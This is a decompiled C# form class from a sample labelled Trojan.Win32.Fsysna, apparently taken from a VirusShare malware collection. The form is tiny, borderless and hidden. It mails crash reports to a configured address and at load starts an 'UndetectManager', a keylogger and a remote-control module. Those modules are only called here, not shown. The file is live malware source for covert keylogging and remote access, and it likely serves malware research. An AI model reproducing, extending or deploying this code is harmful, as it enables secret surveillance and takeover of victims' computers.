// Decompiled with JetBrains decompiler
// Type: Project_Unamed.Form1
// Assembly: Project Unnamed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E14D2CAF-643A-42A5-AF85-1F02787E6112
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkho-1e6991871b0b19bec231c68029dfc8a762f32ed88d5a1aa5b922eb829ff10319.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace Project_Unamed
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.TransparencyKey = SystemColors.Control;
      this.ResumeLayout(false);
    }

    public void Global_Error_Handeler(object sender, UnhandledExceptionEventArgs args)
    {
      Exception exceptionObject = (Exception) args.ExceptionObject;
      Mailer.Send("Unhandled Exception Handeler " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nA unhandled exception occured. The program is unstable now! The program will restart.", Settings.MailStart + "Unhandled Exception Handeler");
      Functions.Restart();
    }

    public void Global_Thread_Error_Handeler(object sender, ThreadExceptionEventArgs args)
    {
      Exception exception = args.Exception;
      Mailer.Send("Unhandled Thread Exception Handeler " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nA unhandled thread exception occured. The program is unstable now! The program will restart.", Settings.MailStart + "Unhandled Thread Exception Handeler");
      Functions.Restart();
    }

    public void HideMe()
    {
      Thread.Sleep(100);
      this.Hide();
      EventLogger.LogEvent("Hiding application...", "Startup");
    }

    public void StartHide() => new Thread(new ThreadStart(this.HideMe)).Start();

    private void Form1_Load(object sender, EventArgs e)
    {
      Control.CheckForIllegalCrossThreadCalls = false;
      EventLogger.LogEvent("Starting up...", "Startup");
      AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(this.Global_Error_Handeler);
      Application.ThreadException += new ThreadExceptionEventHandler(this.Global_Thread_Error_Handeler);
      EventLogger.LogEvent("Global error handelers installed.", "Startup");
      EventLogger.LogEvent("Starting undetect manager", "Startup");
      UndetectManager.Initiliaze();
      Keylogger.Initialize();
      Remote.Initialize();
    }
  }
}
